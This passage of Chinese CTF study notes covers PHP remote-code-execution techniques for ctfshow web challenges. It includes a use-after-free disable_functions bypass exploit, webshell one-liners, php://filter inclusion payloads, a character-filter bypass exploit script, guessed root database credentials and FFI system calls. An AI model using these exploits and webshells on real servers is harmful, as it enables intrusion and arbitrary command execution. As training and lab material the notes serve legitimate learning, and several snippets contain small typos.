        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
?>
```
## 常用payload
### php函数读取源码
#### highlight_file
#### echo file_get_contents
```php
eval('echo file_get_contents('flag.php');')
```
#### show_source

```php
show_source(next(array_reverse(scandir(pos(localeconv())))))
```

-  scandir(’.’):扫描当前目录 
-  localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是`.` 
-  pos(),current():返回数组第一个值 
```php
print_r(scandir(pos(localeconv())));
```

-  array_reverse反转数组，next指向数组指针的下一项 

[https://blog.csdn.net/weixin_43952190/article/details/107061554](https://blog.csdn.net/weixin_43952190/article/details/107061554)
#### rename
```php
rename('flag.php','1.txt')
```
#### scandir扫描目录

- 如果上面的某些函数可以执行，但是flag不在当前目录的flag.php下，尝试改变目录
```php
var_dump(scandir('.')) //获取当前目录下的变量名称
var_dump(scandir('/')) //获取根目录下的变量名称
//也可以使用print_r函数
```
#### 翻php文档中的get、array
```php
get_definded_vars()
get_included_files()//返回所有被 include、 include_once、 require 和 require_once 的文件名
implode()//会把数组转换为字符串
```
### 
### 
### 
### 
### 
### 
### 
### 
### 
### 
### 
### 
### 利用文件包含
#### 包含+输出
```php
eval('include(flag.php);echo $flag')
```
```php
eval('include(flag.php);var_dump(get_defined_vars())')
```
#### 文件包含

-  include文件包含：执行到include函数才包含 
```php
?c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```
 

-  require文件包含：只要程序一运行就包含文件 
```php
?c=require%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```
 

-  上面的payload变形 
```php
?c=require%0a$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```
 

   - 参数a可以不用单引号包裹'a'

### 无字母webshell(web55)

当限制了所有字母时，采用这种方式
#### 构造post上传数据包

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

- 发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母

#### glob通配符

-  glob支持用`[^x]`的方法来构造“这个位置不是字符x 
```shell
ls /???/???[^-]????
```
 

-  glob支持利用`[0-9]`来表示一个范围
-  由于Php文件名最后一个字符是大写字母，大写字母的ASCII码值在@-[之间 
```shell
[@-[]//表示大写字母
```
#### #!/bin/sh

- #!/bin/sh是对shell的声明，说明你所用的是哪种类型的shell及其路径所在
- 如果没有声明，则脚本将在默认的shell中执行，默认shell是由用户所在的系统定义为执行shell脚本的shell
#### 可能遇到的问题

- 如果cat flag.php查不到，用cat /var/www/html/flag.php


### $(())运算符（web 55左右）
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1666836279353-ecc69f6f-cc29-423d-962f-9d7b736f437b.png#averageHue=%23fefefd&clientId=uc5d0d9f8-cd95-4&from=paste&height=148&id=ud26965c1&originHeight=295&originWidth=1517&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32338&status=done&style=none&taskId=u71cbcfd1-c67e-4051-b0ac-52fc3e8a55e&title=&width=758.5)

- 这个题没有过滤$
- 通过~$(())=-1和$(())=0，构造36
#### ${_}

- 获取上次的执行结果

#### $(()）

- linux中$(())是运算符，里面括号中的值可以进行运算。$(())=0
#### 原码、反码、补码
反码的表示方法是:

- 正数的反码是其本身
- 负数的反码是在其原码的基础上, 符号位不变，其余各个位取反.

[+1] = [00000001]原 = [00000001]反<br />[-1] = [10000001]原 = [11111110]反<br />补码的表示方法是:

- 正数的补码就是其本身
- 负数的补码是在其原码的基础上, 符号位不变, 其余各位取反, 最后+1. (即在反码的基础上+1)

[+1] = [00000001]原 = [00000001]反 = [00000001]补<br />[-1] = [10000001]原 = [11111110]反 = [11111111]补<br />对于0来说，0000 0000，计算机中用补码表示负数，因此~0(对0按位取反)的结果是：

- 1111 1111 ->相当于一个负数的原码->1000 0000 -> 1000 0001，即为-1
- ~n=-(n+1)
### url编码生成字符

- 该题目限制了许多字符，但没有限制或运算的字符
- 利用字符的url编码，构造一个字符集，每个字符通过两个字符的或运算得到
#### php特性

- PHP7中可以使用`('phpinfo')();`来执行函数
#### 
#### 生成字符集的php代码
```php
<?php
  $myfile = fopen("rce_or1.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
  for ($j=0; $j <256 ; $j++){ 

    if($i<16){
//             把10进制转换成16进制
      $hex_i='0'.dechex($i);
    }
    else{
      $hex_i=dechex($i);
    }
    if($j<16){
      $hex_j='0'.dechex($j);
    }
    else{
      $hex_j=dechex($j);
    }
    $preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
    //hex2bin() 函数把十六进制值的字符串转换为字符,2位为1组

    if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
      echo "";
    }
    else{
      $a='%'.$hex_i;
      $b='%'.$hex_j;
      $c=(urldecode($a)|urldecode($b));
      //   ord返回ASCII码值
      if(ord($c)>=32&ord($c)<=126){
        $contents = $contents.$c." ".$a." ".$b."\n";
      }
    }
  }
}
fwrite($myfile,$contents);
fclose($myfile);

// $a='%01';
// $b='%40';//这个是字符的16进制AsCII码值+%
// echo urldecode($a).PHP_EOL;
// echo urldecode($b).PHP_EOL;
// $c=(urldecode($a)|urldecode($b));
// echo $c;
?>
```

- urlencode就是%加上字符的16进制AsCII码值
#### exp脚本
```python
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
# os.system("php a.php")  # 没有将php写入环境变量需手动运行
# if (len(argv) != 2):  # argv是命令行参数
#     print("="*50)
#     print('USER：python exp.py <url>')
#     print("eg：  python exp.py http://ctf.show/")
#     print("="*50)
#     exit(0)
url = "http://6a1d4bda-b460-46e2-aea2-86d8ca7954b1.challenge.ctf.show/"


def action(arg):
    s1 = ""
    s2 = ""
    output = ""
    for i in arg:
        f = open("rce_xor_1.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i and t[2:5] == "%87":
            # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
    output = "(\""+s1+"\"^\""+s2+"\")"
    print(output + "\n")
    return output
    
param = action("system") + \
action("cat flag.php")
data = {
    'c': urllib.parse.unquote(param)
}
print(data)

r = requests.post(url, data=data)
print("\n[*] result:\n"+r.text)
```
#### 取反也行
```php
<?php
$a = "%8c%86%8c%8b%9a%92";
$b = "%9c%9e%8b%df%99%d5";
echo ~urldecode($a).PHP_EOL;//system
echo ~urldecode($b).PHP_EOL;//cat f*
echo 1?"aaa":"bbb";//输出aaa
?>
```
![](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669449868088-c2710a5e-1469-4f3b-ad97-d5868f1c5ffe.png#averageHue=%23fefefd&from=url&id=lr43R&originHeight=536&originWidth=1740&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```shell
v1=1&v2=0&v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):
```
#### 注意点
对于生成结果的问题：
:::info

- 对于下面这种方式，直接生成的就是可以执行的参数，不用再加单引号，也就是形式是(system)(ls)，

经过测试发现也不一定，有的不加单引号也执行不了。<br />`(system)(ls) ('system')('ls') ("system")("ls")`**都有可能**

- 只不过括号里面对应的是或运算的结果
- 把下面的或运算改了，会生成对应运算符的字符集
- **在用异或(^)要用可见字符,在用或( | )运算的时候，发现其实也不一定······· **
- 对于结果，最好选择在一个生成字符的区域内和ASCII码值32-128对应的字符差不多的去生成，且最好前缀都一样，**同样针对异或(^)，因为可以找到很多个块，对于或运算，可以让脚本自己跑**

也就是：<br /> 	对于(system)(ls)<br />("%87%87%87%87%87%87"^"%f4%fe%f4%f3%e2%ea")("%87%87"^"%eb%f4")

- 因此上面限制了t[2:5] == "%87" 就是为了这个目的
:::
对于ASCII码，16进制的问题：
```php
$a='%01';
$b='%40';//这个是字符的16进制AsCII码值+%
echo urldecode($a).PHP_EOL;
echo urldecode($b).PHP_EOL;
$c=(urldecode($a)|urldecode($b));
echo $c;
```
:::info

- url编码从%00-%ff，其中% + 每个字符对应的16进制ASCII码就是它的url编码

例子：

   - a 的url编码是%61 a 的16进制ASCII码是61
:::
```php
$a='%0d';
$b='%60';
echo $a | $b;
// "od" 对应的ascii码 0x30 0x64
// "60" 对应的ascii码 0x36 0x30
// 两者或得到 x36 x74 -> “6t!

$a='%0d';
$b='%60';
//但是 这里如果通过url发送，就会先解码，再或，即
echo urldecode($a) | urldecode($b)
```
对于eval中执行的命令问题<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669449868088-c2710a5e-1469-4f3b-ad97-d5868f1c5ffe.png#averageHue=%23fefefd&clientId=uc311d1cc-45c9-4&from=paste&height=244&id=u83da8ae1&originHeight=536&originWidth=1740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90128&status=done&style=none&taskId=u5ba7f688-450a-4973-ac20-1b32d7b67ba&title=&width=790.9090737665985)
:::info
**在具体执行时需要测试**<br />对于上面的`$code = eval("return $v1$v3$v2;");`<br />如果是`$code = eval("return 1-(system)(ls)-1;");` 这是可以执行的<br />由于过滤了+ - ，可以用* ,**连接运算符还可以用三元运算符**<br />`$code = eval("return 1*(system)(ls)*1;");`，php会当成运算执行
:::
#### python发送post请求
```
# 导入 requests 包
import requests

# 表单参数，参数名为 fname 和 lname
myobj = {'fname': 'RUNOOB','lname': 'Boy'}

# 发送请求
x = requests.post('https://www.runoob.com/try/ajax/demo_post2.php', data = myobj)

# 返回网页内容
print(x.text)
```
### php连接mysql获取数据（web75）
#### 适用条件

- 当获取到根目录下有/flag36.txt文件，无法使用system、include、uaf读取时，用该方法
#### information_schema数据库
[https://www.jianshu.com/p/86f1ad36e548](https://www.jianshu.com/p/86f1ad36e548)

- 该数据库中有很多表，如schemata表中存储的是数据库的名称信息
```sql
select * from information_schema.schemata//相当于show databases;
```
#### PDO连接数据库
[https://www.runoob.com/php/php-pdo.html](https://www.runoob.com/php/php-pdo.html)

- 这里猜测用户名和密码都是root
```php
$dsn = "mysql:host=localhost;dbname=information_schema";
$db = new PDO($dsn, 'root', 'root');
$rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");
foreach($rs as $row){
        echo($row[0])."|"; 
}exit();

```
#### load_file加载flag
```php
$dsn = "mysql:host=localhost;dbname=//上一步查出的数据库名称//";
$db = new PDO($dsn, 'root', 'root');
$rs = $db->query("select load_file('/flag36.txt')");
foreach($rs as $row){
        echo($row[0])."|"; 
}exit();

```
### FFI调用外部函数接口读取文件
[https://www.php.net/manual/zh/ffi.cdef.php](https://www.php.net/manual/zh/ffi.cdef.php)
```php
$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
$a='/readflag > 1.txt';//没有回显的
$ffi->system($a);//通过$ffi去调用system函数
```

- FFI:cdef原型的描述为public static FFI::cdef(string $code = "", ?string $lib = null)，其中$code为一个字符串，包含常规C语言中的一系列声明，$lib为要加载和链接的共享库文件名称，如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号
- 上面的_**int system(const char *command);**_是c语言中对于system函数的定义
- 使用范围：**PHP 7.4**
# 6. php特性
## php函数
### php preg_replace()函数

```php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

-  存在的安全问题：/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后) 
```php
preg_replace("/test/e",$_GET["h"],"jutst test");
```
<br />如果提交?h=phpinfo()，会执行这个函数 

### eval函数

- 该函数会把字符串当成php代码执行

### highlight_file函数

-  高亮显示php代码 
```php
highlight_file("index.php");
```

- 支持伪协议

### glob函数

-  glob() 函数返回一个包含匹配指定模式的文件名或目录的数组 
```php
<?php
print_r(glob("*.txt"));
?>
```
 
### intval函数

- 该函数在后面参数为0时，会自动检测输入的类型
```php
$num = 010574 //八进制
intval($num,0)
```
### file_put_contents
```php
file_put_contents($v3, $str) //向v3中写入str
```

- 该函数第一个参数可以传伪协议
```php
file_put_contents(php://filter/write=convert.base64-decode/resource=1.php, $str)

file_put_contents(php://filter/write=convert.base64-encode/resource=1.php, $str)
```

- 这里既可以用加密也可以用解密
#### 
### is_file函数
:::info
可以使用伪协议绕过
:::

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668828764199-137758fa-3528-47b1-9988-504df39eccbc.png#averageHue=%23ced7c1&clientId=u6015fdbf-26e3-4&from=paste&height=136&id=ucbedc8f4&originHeight=272&originWidth=1674&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49512&status=done&style=none&taskId=u1f8d6a67-e2a3-425e-a11c-fa022396076&title=&width=837)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668828737109-db5da990-bb8c-4245-a901-5d7b45192353.png#averageHue=%23fefefd&clientId=u6015fdbf-26e3-4&from=paste&height=236&id=uae828b51&originHeight=471&originWidth=1221&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44802&status=done&style=none&taskId=ud0f0e987-1ed8-4ffd-9e6e-0518c638679&title=&width=610.5)<br />当传入`file=php://filter/resource=1.php`时，is_file不认为这是一个文件，所以可以执行highlight_file

### is_numric函数
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668948013685-ecb22013-fdf1-4493-b2a3-14badd96f3a9.png#averageHue=%23fefefe&clientId=u88d22218-0a90-4&from=paste&height=353&id=uf466b17b&originHeight=706&originWidth=1342&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71368&status=done&style=none&taskId=u35336fb0-a698-4622-a2a7-eff13b50677&title=&width=671)

- %0a可以绕过这个函数
```php
<?php
$a = $_GET['num'];
var_dump(isnumric($a);//get传入num=%0a36，这里会返回true
?>
```
### trim函数
[https://www.php.net/manual/zh/function.trim](https://www.php.net/manual/zh/function.trim)![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668948260568-5e2a3eea-e0d5-4d13-ada3-8426554eb0dd.png#averageHue=%23f0efee&clientId=u88d22218-0a90-4&from=paste&height=297&id=u59ccb5ee&originHeight=594&originWidth=1607&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118987&status=done&style=none&taskId=ua1a81ccd-8cf7-4964-8cba-27d3151a24b&title=&width=803.5)

- 可以用%0c绕过
## 
## php短标签

-  `<?php?>`为长标签，`<??>`为短标签，`<?=`相当于echo，以下四种输出均为2022 
```php
<?php echo(date('Y')) ?>
<?php eval("echo(date('Y'));") ?>


<?= date('Y'); ?>
<?php eval("?><?= date('Y');") ?>
```
 

   - 3可以理解为，用了php短标签，<?=相当于echo，不用再多写一个<?=
   - 4可以理解为，eval把字符串当成php代码执行，把括号里面的拿出来需要先闭合前面的<?php

#### 短标签一句话木马 

```php
<?=eval($_REQUEST['cmd']);?>
<?= `$_GET[1]`> //``反引号相当于system,请把system理解成和phpinfo()一样的函数

<?=phpinfo();  //还可以这样写
```
 

-  
-  对于eval函数，执行命令时，后面要加; 
```php
eval('phpinfo();')
```
 

## php上传机制

- php上传文件后会将文件存储在临时文件夹，然后用move_uploaded_file() 函数将上传的文件移动到新位置。临时文件夹可通过php.ini的upload_tmp_dir 指定，默认是**/tmp目录**

### 临时文件命名规则

- 默认为 php+4或者6位随机数字和大小写字母
- linux下：phpXXXXXX
### \x09

- \x09表示ASCII码值为09的字符
## php特殊的执行函数命令

- PHP7中可以使用`('phpinfo')();`来执行函数，('system')('ls')
- php中只要变量后紧跟着()，那么就对这个变量进行函数调用
```php
$a = "phpinfo";
echo $a();
```

## php换行符
```php
echo "$var_name1 是数字" . PHP_EOL;
```

## php运算符

### 优先级
[https://www.php.net/manual/zh/language.operators.precedence.php](https://www.php.net/manual/zh/language.operators.precedence.php)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668653808347-981ae686-e191-484d-8656-8db69481427f.png#averageHue=%23f1f1f0&clientId=u5069738d-67bf-4&from=paste&height=1087&id=u742de12c&originHeight=2173&originWidth=1691&originalType=binary&ratio=1&rotation=0&showTitle=false&size=261857&status=done&style=none&taskId=ue191b743-65cb-499c-b1f9-f2336b8edf9&title=&width=845.5)

- 优先级从高到低

### 三元运算符
```php
$_str = $_GET['abc'] ? 'a' : 'b';
```

- 当abc为空时，返回，'b'，否则返回'a'
### 

## php的传值和引用
### 函数传值
[https://www.php.cn/php-notebook-172859.html](https://www.php.cn/php-notebook-172859.html)
```php
$a = 1;
function &func(&$a) {
return $a;
}
$b = func($a);
$c =& func($a);
$b = 2;
echo "a: $a, b: $b, c: $c.
/n";
//输出a: 1, b: 2, c: 1.
//可见对$b的修改不会影响$a
$c = 3;
echo "a: $a, b: $b, c: $c.
/n";
//输出a: 3, b: 2, c: 3.
//可见对$c的修改会影响$a
```
一个例子：
```php
<?php
  include("flag.php");
  $_GET?$_GET=&$_POST:'flag';
  $_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
  $_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
  highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
?>

```
等同于
```php
$_GET?$_GET=&$_POST:'flag';
===============>
if(isset($_GET)){
	$_GET=&$_POST;
}else{
	'flag';
}

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

```
### php使用GET传递数组
```php
<?php 
	print_r($_GET['num']);
?>
```

- 正确的传递姿势为num[]

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667444074266-d3894477-db63-48b4-b4bd-c555e14cb72b.png#averageHue=%23f6f6f6&clientId=ue180f87e-8418-4&from=paste&height=146&id=lVALx&originHeight=292&originWidth=988&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30346&status=done&style=none&taskId=u77271ed5-120f-4c54-aef7-c4286141401&title=&width=494)

- 这里不能/?num = array('foo')，它只是传递参数，并不能执行

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667444140248-fea9f94d-c1f5-4aaa-b355-a7eb09ee55b3.png#averageHue=%23f6f5f5&clientId=ue180f87e-8418-4&from=paste&height=134&id=WguYY&originHeight=267&originWidth=1105&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32910&status=done&style=none&taskId=ubddd551d-1185-416d-a250-2515925b65d&title=&width=552.5)
## 反射类
```php
<?php
class A{
public static $flag="flag{123123123}";
const  PI=3.14;
static function hello(){
    echo "hello</br>";
}
}
$a=new ReflectionClass('A');


var_dump($a->getConstants());  获取一组常量
输出
 array(1) {
  ["PI"]=>
  float(3.14)
}

var_dump($a->getName());    获取类名
输出
string(1) "A"

var_dump($a->getStaticProperties()); 获取静态属性
输出
array(1) {
  ["flag"]=>
  string(15) "flag{123123123}"
}

var_dump($a->getMethods()); 获取类中的方法
输出
array(1) {
  [0]=>
  object(ReflectionMethod)#2 (2) {
    ["name"]=>
    string(5) "hello"
    ["class"]=>
    string(1) "A"
  }
}

```
### 例子
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668655168158-0d641fb4-aecc-4373-8972-9a5151a45914.png#averageHue=%23fefefd&clientId=u5069738d-67bf-4&from=paste&height=302&id=ub4a726c3&originHeight=604&originWidth=1032&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52263&status=done&style=none&taskId=uf056f5d9-53eb-4bd4-b2f8-644ee6195f9&title=&width=516)

- 直接传入v2=echo new ReflectionClass
## $_GET和$_POST
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668742690571-dc4f9985-6205-4147-8b30-261d6d2bfc2c.png#averageHue=%23fefdfd&clientId=u4787ae80-6c34-4&from=paste&height=355&id=u7193ddfa&originHeight=710&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82433&status=done&style=none&taskId=u8d0fc32f-75f7-4ec4-ae61-b0158960f84&title=&width=445)

- 在提交时，如a=1，对于$_GET，它是一个数组，提交a=1，a是key,1是value
```php
<?php
foreach($_GET as $key => $value){
    var_dump('$key is'. $key.'$value is'. $value);
}
?>
```
## ![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668742837802-72a32219-7d44-4107-9073-37dcaaaf0853.png#averageHue=%23fcfbfb&clientId=u4787ae80-6c34-4&from=paste&height=611&id=uc87780b3&originHeight=1222&originWidth=2392&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112465&status=done&style=none&taskId=u917cfef2-3b5b-4dcf-ae5f-70cff9499e4&title=&width=1196)
## php变量名称
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668953847666-42ff61b3-ad79-4684-99f5-4ad49bcabcb2.png#averageHue=%23fefdfd&clientId=u1dab4844-0272-4&from=paste&height=199&id=ue7c76410&originHeight=398&originWidth=1450&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51821&status=done&style=none&taskId=u8062125a-1040-4492-bf47-9b2be1e74ab&title=&width=725)

- 在php中变量名只有数字字母下划线，被get或者post传入的变量名，**如果含有空格、+、[、. 则会被转化为_**
- **在检测时，只会检测最先遇到的字符**
```php
CTF[SHOW.COM//[转换为_，.被保留
```

- 所以无法构造CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换
## 命名空间
\指根命名空间，也就是默认的命名空间
```php
<?php
\phpinfo();
phpinfo(); //两个代码等效
?>
```
## 类加载
[https://www.php.net/manual/zh/function.class-exists](https://www.php.net/manual/zh/function.class-exists)

- 在一个类调用class_exists时，会判断这个类是否加载
```php
<?php
spl_autoload_register(function ($class_name) {
    include $class_name . '.php';

    // 检查 include 后是否声明了类
    if (!class_exists($class_name, false)) {
        throw new LogicException("Unable to load class: $class_name");
    }
});

if (class_exists(MyClass::class)) {
    $myclass = new MyClass();
}

?>
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669538001558-2e15c824-af90-4110-b2df-a1d8e4990b28.png#averageHue=%23fefefe&clientId=u6daebb42-e26a-4&from=paste&height=444&id=ucf804d77&originHeight=976&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108714&status=done&style=none&taskId=ub8fd7c59-9718-4ff3-95dc-67082e4da9f&title=&width=538.1818065170417)

- 这里get传入参数`?..CTFSHOW..=phpinfo`，会调用__autoload方法。
## 
## 
## 常用payload
### 命令闭合
#### 行内注释
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668653918640-a512ff7d-45d4-4cba-8751-c47f225ef127.png#averageHue=%23fefefd&clientId=u5069738d-67bf-4&from=paste&height=238&id=u5234e527&originHeight=476&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48471&status=done&style=none&taskId=u5f62dbc9-8eec-42e0-9930-e14b3912990&title=&width=502.5)

- 这里可以构造闭合
```php
eval("$v2('ctfshow')$v3");

//传入v2=system("ls")/*&v3=*/;

eval("system("ls")/*('ctfshow')*/;");
//注意这里ls要＋双引号

```
#### 直接闭合

```php
eval("$v2('ctfshow')$v3");

//传入v2=phpinfo()?>%23&v3=;

eval("phpinfo()?>%23('ctfshow')$v3");
//注意这里ls要＋双引号
```

- 这里要用%23，用#可能不好使

### 正则匹配
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667478860805-a808c8c1-42a2-49f3-9ae7-68e73a7f468d.png#averageHue=%23fefdfd&clientId=uc3456c97-0885-4&from=paste&height=229&id=ezynW&originHeight=457&originWidth=669&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32987&status=done&style=none&taskId=u79104fd6-0357-40d6-9d9d-1b03452cd58&title=&width=334.5)

- ^表示以php开头，$表示以php结尾，所以字符串只能是php
- /m表示多行匹配，因此会逐行查找。第二个正则没有多行查找，只看第一行，所以无法满足条件
```php

php//上面会先换行，因为%0a
```

### 弱类型
[https://www.php.net/manual/zh/language.operators.comparison.php](https://www.php.net/manual/zh/language.operators.comparison.php)
```php
<?php
$num = '';
    if($num==4476){
        die("1");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("2");
    }
    if(!strpos($num, "0")){
        die("3!");
    }
    if(intval($num,0)===4476){
        echo "yes";
    }

?>
```

- + 和 -在**字符串开头**时，会被认为是正号和负号，不会当成字符，仅限开头

#### 例1
[https://www.php.net/manual/zh/language.operators.comparison.php](https://www.php.net/manual/zh/language.operators.comparison.php)<br />**看文档**
#### ![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668948195713-037c6890-7fee-464a-90c6-c553e897eefa.png#averageHue=%23fefefd&clientId=u88d22218-0a90-4&from=paste&height=340&id=u768af4f3&originHeight=679&originWidth=1216&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70346&status=done&style=none&taskId=ubad401f3-9f6e-453c-b60f-1d09b061d17&title=&width=608)

- is_numric用%0a绕过
- num !=='36'是不全等，因此传入的%0c36变成可见字符+36，因此不全等
- %0c绕过trim
- 传入的%0c36和36是弱类型比较，会先进行类型转换再比较，因此相等
### 
### 
### null绕过if判断
#### 例1 md5或sha1
```php
<?php
  include("flag.php");
  highlight_file(__FILE__);
  if (isset($_POST['a']) and isset($_POST['b'])) {
  	if ($_POST['a'] != $_POST['b'])
  		if (md5($_POST['a']) === md5($_POST['b']))
  			echo $flag;
  		else
  			print 'Wrong.';
  }
?>
```

- 这里可以传入a[]=1，b[]=2，此时md5($_POST['a']、md5($_POST['b']都会返回null
### 变量覆盖
[https://blog.csdn.net/qq_41381461/article/details/90047616](https://blog.csdn.net/qq_41381461/article/details/90047616)
```php
<?php
$id=5;
foreach ($_GET as $key => $value) {
	$$key = $value;
}
echo $a;
?>

```

- **如果传入id = 1，也就是会把$id =1。**

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668744187195-d9095fb0-68f0-4eaf-a360-d249f18c1bd3.png#averageHue=%23fefdfc&clientId=u4787ae80-6c34-4&from=paste&height=330&id=u73e5c389&originHeight=659&originWidth=639&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76205&status=done&style=none&taskId=u876eb246-9f52-4648-aeab-e7290532822&title=&width=319.5)

- 这里如果传入get参数x=flag，也就是会$x=$flag
- 这里可以构造后面的 post['flag'] == $flag
- 那么可以让左右两边都等于Null，也就是post不提交，get提交flag为空,但是这样会覆盖原有的flag，因此需要先把flag赋值给suces，再置空
```shell
?flag=&suces=flag
```
#### 变量覆盖$$ 和 &
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668826674935-c9ded884-ece0-420b-a4e3-274b205c3793.png#averageHue=%23fefefe&clientId=u6015fdbf-26e3-4&from=paste&height=388&id=u2b56d7e9&originHeight=776&originWidth=1789&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86966&status=done&style=none&taskId=uf640e120-9361-452f-a6ca-a77fcbd665b&title=&width=894.5)
```php
<?php
function getFlag(&$v1,&$v2){
    //$$v1=$ctfshow    &$$v2= &$flag
    //eval("$$v1 = &$$v2;");   --- >  eval("$ctfshow = &$flag;")
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


$v1 = 'ctfshow';
$v2 = 'flag';
?>
```

- 所以这里需要使v2=flag，但flag是外部变量，无法直接访问，因此可以用Global
:::info
[https://www.runoob.com/php/php-superglobals.html](https://www.runoob.com/php/php-superglobals.html)<br />$GLOBALS 是PHP的一个超级全局变量组，在一个PHP脚本的全部作用域中都可以访问。<br />$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
